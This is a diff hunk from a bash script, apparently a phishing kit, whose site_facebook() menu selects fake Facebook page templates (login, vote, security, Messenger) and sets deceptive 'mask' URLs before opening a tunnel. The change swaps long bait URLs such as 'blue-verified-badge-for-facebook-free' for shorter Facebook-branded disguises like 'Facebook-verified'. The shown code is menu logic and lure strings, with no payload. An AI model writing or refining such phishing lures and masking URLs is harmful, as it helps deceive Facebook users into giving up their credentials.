@@ -308,19 +308,19 @@ site_facebook() {
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
-		mask='http://blue-verified-badge-for-facebook-free'
+		mask='http://Facebook-verified'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		website="fb_advanced"
-		mask='http://vote-for-the-best-social-media'
+		mask='http://Facebook-vote'
 		tunnel_menu
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		website="fb_security"
-		mask='http://make-your-facebook-secured-and-free-from-hackers'
+		mask='http://Facebook-secure'
 		tunnel_menu
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
 		website="fb_messenger"
-		mask='http://get-messenger-premium-features-free'
+		mask='http://Facebook-Message'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
